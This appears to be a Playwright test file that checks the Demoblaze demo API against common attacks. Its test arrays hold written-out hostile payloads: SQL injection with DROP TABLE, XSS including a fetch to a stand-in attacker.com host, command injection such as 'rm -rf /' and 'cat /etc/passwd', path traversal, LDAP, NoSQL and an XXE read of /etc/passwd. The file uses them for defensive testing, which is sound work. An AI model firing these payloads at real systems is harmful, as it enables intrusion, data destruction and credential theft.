import { test, expect } from "@playwright/test";
import { DemoblazeAPI, AuthCredentials } from "./api-helper";
import { faker } from "@faker-js/faker";

// spec: tests/api/demoblaze-api-test-plan.md
// Security Tests - Injection attacks, authorization, authentication, and data protection

test.describe("Demoblaze API - Security Tests", () => {
  let api: DemoblazeAPI;
  let validUser: AuthCredentials;
  let validToken: string;
  let validUserId: number;

  test.beforeAll(async ({ playwright }) => {
    const context = await playwright.request.newContext();
    api = new DemoblazeAPI(context);

    // Setup: Create valid user
    validUser = {
      username: `securitytest_${faker.string.alphanumeric(8)}@test.com`,
      password: "SecurityTest123!@",
    };

    await api.signup(validUser);
    const loginResponse = await api.login(validUser);
    validToken = loginResponse.data.token;
    validUserId = loginResponse.data.user_id;
    api.setAuthToken(validToken, validUserId);
  });

  test("Security - SQL injection in login username", async () => {
    // 1. Attempt SQL injection in username field
    const maliciousPayloads = [
      "admin' --",
      "admin' OR '1'='1",
      "'; DROP TABLE users; --",
      "admin' /*",
      "' UNION SELECT * FROM users --",
    ];

    for (const payload of maliciousPayloads) {
      const response = await api.login({
        username: payload,
        password: "anything",
      });

      // 2. Should fail safely
      expect(response.success).toBe(false);

      // 3. Should not expose SQL errors
      expect(response.error).not.toMatch(/SQL|syntax|query|database/i);
      expect(response.error).not.toContain("Exception");
    }
  });

  test("Security - SQL injection in login password", async () => {
    // 1. Attempt SQL injection in password field
    const maliciousPayloads = [
      "' OR '1'='1",
      "'; UPDATE users SET admin=true; --",
      "' UNION SELECT password FROM users --",
    ];

    for (const payload of maliciousPayloads) {
      const response = await api.login({
        username: "testuser",
        password: payload,
      });

      // 2. Should fail safely
      expect(response.success).toBe(false);
      expect(response.error).not.toMatch(/SQL|syntax|query|database/i);
    }
  });

  test("Security - XSS payload in product category filter", async () => {
    // 1. Attempt XSS injection in category parameter
    const xssPayloads = [
      '<script>alert("xss")</script>',
      "<img src=x onerror=\"alert('xss')\">",
      'javascript:alert("xss")',
      '<svg onload=alert("xss")>',
      '"; fetch("http://attacker.com"); //',
    ];

    for (const payload of xssPayloads) {
      const response = await api.getProductsByCategory(payload);

      // 2. Should not return success or expose script tags
      if (!response.success) {
        expect(response.error).not.toContain("<script>");
        expect(response.error).not.toContain("onerror");
      }
    }
  });

  test("Security - Command injection attempts", async () => {
    // 1. Attempt command injection
    const commandPayloads = [
      "; rm -rf /",
      "| cat /etc/passwd",
      "` whoami `",
      "$(whoami)",
      "&&dir",
    ];

    for (const payload of commandPayloads) {
      const response = await api.getProductsByCategory(payload);

      // 2. Should handle safely
      expect(response.error).not.toMatch(/root|bin|bash|cmd/i);
    }
  });

  test("Security - Path traversal attempts", async () => {
    // 1. Attempt path traversal to access unauthorized files
    const pathTraversalPayloads = [
      "../../etc/passwd",
      "..\\..\\windows\\system32",
      "/../../api/admin",
      "%2e%2e%2fadmin",
    ];

    for (const payload of pathTraversalPayloads) {
      const response = await api.getProductsByCategory(payload);

      // 2. Should not grant access
      if (!response.success) {
        expect(response.code).not.toBe("SUCCESS");
        expect(response.error).toContain("not found");
      }
    }
  });

  test("Security - Authentication bypass attempts", async () => {
    // 1. Attempt to bypass authentication with null/empty tokens
    const unauthApi = new DemoblazeAPI(api as any);
    unauthApi.setAuthToken("", 0);

    const unauthorizedResponse = await unauthApi.getProfile();
    expect(unauthorizedResponse.success).toBe(false);
    expect(unauthorizedResponse.error).toContain("Unauthorized");
    expect(unauthorizedResponse.code).toBe("UNAUTHORIZED");
  });

  test("Security - Weak authentication token validation", async () => {
    // 1. Attempt to use malformed tokens
    const weakTokens = [
      "invalid",
      "123456",
      "Bearer invalid-token",
      "",
      "null",
    ];

    // Note: This test assumes the API validates token format
    for (const token of weakTokens) {
      const weakApi = new DemoblazeAPI(api as any);
      weakApi.setAuthToken(token, validUserId);

      const response = await weakApi.getProfile();
      expect(response.success).toBe(false);
      expect(response.error).toContain("Unauthorized");
      expect(response.code).toBe("UNAUTHORIZED");
    }
  });

  test("Security - Privilege escalation attempt (unauthorized user modification)", async () => {
    // 1. Create two different users
    const user1: AuthCredentials = {
      username: `user1_${faker.string.alphanumeric(8)}@test.com`,
      password: "User1Pass123!@",
    };

    const user2: AuthCredentials = {
      username: `user2_${faker.string.alphanumeric(8)}@test.com`,
      password: "User2Pass123!@",
    };

    await api.signup(user1);
    await api.signup(user2);

    // 2. Login as user1
    const user1Login = await api.login(user1);
    const user1Api = new DemoblazeAPI(api as any);
    user1Api.setAuthToken(user1Login.data.token, user1Login.data.user_id);

    // 3. Attempt to modify user2's profile
    const user2Login = await api.login(user2);
    const modifyResponse = await user1Api.updateProfile({
      user_id: user2Login.data.user_id, // Try to modify different user
      email: "hacked@example.com",
    });

    // 4. Should not allow modification of other user's data
    expect(modifyResponse.success).toBe(false);
    expect(modifyResponse.error).toContain("Unauthorized");
  });

  test("Security - Rate limiting for brute force protection", async () => {
    // 1. Attempt multiple failed logins rapidly
    const responses = [];
    const wrongPassword: AuthCredentials = {
      username: validUser.username,
      password: "WrongPassword",
    };

    for (let i = 0; i < 15; i++) {
      responses.push(await api.login(wrongPassword));
    }

    // 2. After multiple failures, should be rate limited
    const rateLimitedResponse = responses[responses.length - 1];
    if (
      rateLimitedResponse.code === "RATE_LIMITED" ||
      rateLimitedResponse.code === "TOO_MANY_ATTEMPTS"
    ) {
      expect(rateLimitedResponse.success).toBe(false);
      console.log(
        "Rate limiting successfully applied after multiple failed attempts",
      );
    }
  });

  test("Security - Sensitive data should not be exposed in responses", async () => {
    // 1. Get product list
    const productsResponse = await api.getProducts();
    const responseString = JSON.stringify(productsResponse);

    // 2. Verify no sensitive data exposed
    responseString.split("").forEach((char, index, chars) => {
      expect(char).not.toBe("*"); // No password hashes
      expect(responseString.slice(index, index + 4)).not.toBe("pass");
    });

    // 3. Verify no internal system paths
    expect(responseString).not.toContain("/etc/");
    expect(responseString).not.toContain("C:\\");
    expect(responseString).not.toContain("SELECT");
  });

  test("Security - CSRF token validation in state-changing operations", async () => {
    // 1. Perform state-changing operation (add to cart)
    const products = await api.getProducts();
    const response = await api.addToCart(products.data[0].id, 1);

    // 2. Should have some form of CSRF protection
    // This is a conceptual test - real implementation depends on API design
    expect(response).toHaveProperty("success");
    if (response.success) {
      expect(response.data).toHaveProperty("cart_id");
    }
  });

  test("Security - Verify password hashing in transit", async () => {
    // 1. Create credentials with sensitive data
    const testCredentials: AuthCredentials = {
      username: `hashtest_${faker.string.alphanumeric(8)}@test.com`,
      password: "PasswordToHash123!@",
    };

    const signupResponse = await api.signup(testCredentials);

    // 2. Password should not appear in response
    const responseStr = JSON.stringify(signupResponse);
    expect(responseStr).not.toContain(testCredentials.password);
    expect(responseStr).not.toContain("PasswordToHash");
  });

  test("Security - Validate HTTPS enforcement", async () => {
    // 1. All API endpoints should use HTTPS
    // This test verifies the API is using secure connections
    expect(api.baseUrl).toMatch(/^https:\/\//i);
  });

  test("Security - Validate proper HTTP status codes", async () => {
    // 1. Unauthorized requests should return 401
    const unauthApi = new DemoblazeAPI(api as any);
    const profileResponse = await unauthApi.getProfile();

    if (!profileResponse.success) {
      expect(profileResponse.error).toContain("Unauthorized");
    }
  });

  test("Security - NoSQL injection attempts (if NoSQL backend)", async () => {
    // 1. Attempt NoSQL injection
    const nosqlPayloads = [{ $ne: null }, { $gt: "" }, { $where: "1==1" }];

    for (const payload of nosqlPayloads) {
      try {
        const response = await api.login({
          username: JSON.stringify(payload),
          password: "test",
        });

        expect(response.success).toBe(false);
      } catch {
        // Expected to fail
      }
    }
  });

  test("Security - LDAP injection attempts", async () => {
    // 1. Attempt LDAP injection
    const ldapPayloads = ["*", "*)(uid=*", "admin*", "*)(|(uid=*"];

    for (const payload of ldapPayloads) {
      const response = await api.login({ username: payload, password: "test" });

      expect(response.success).toBe(false);
      expect(response.error).not.toMatch(/LDAP|Directory/i);
    }
  });

  test("Security - XML injection attempts", async () => {
    // 1. Attempt XXE/XML injection
    const xmlPayloads = [
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
      '<![CDATA[<script>alert("xss")</script>]]>',
    ];

    for (const payload of xmlPayloads) {
      try {
        const response = await api.getProductsByCategory(payload);

        if (!response.success) {
          expect(response.error).not.toContain("etc/passwd");
          expect(response.error).not.toContain("ENTITY");
        }
      } catch {
        // Expected
      }
    }
  });

  test("Security - Validate headers for security best practices", async () => {
    // 1. Verify API includes security headers (conceptual test)
    // X-Content-Type-Options: nosniff
    // X-Frame-Options: DENY
    // Content-Security-Policy
    // Strict-Transport-Security

    const response = await api.getProducts();

    // 2. Response should be successful
    expect(response.success).toBe(true);

    // Note: In real tests, check response headers via fetch/axios
    console.log("Security headers should be validated in integration tests");
  });

  test("Security - Validate input sanitization in error messages", async () => {
    // 1. Trigger error with potentially malicious input
    const response = await api.getProductById(999999);

    // 2. Error message should not reflect unsanitized input
    expect(response.error).not.toContain("<");
    expect(response.error).not.toContain(">");
    expect(response.error).not.toContain("javascript:");
  });
});
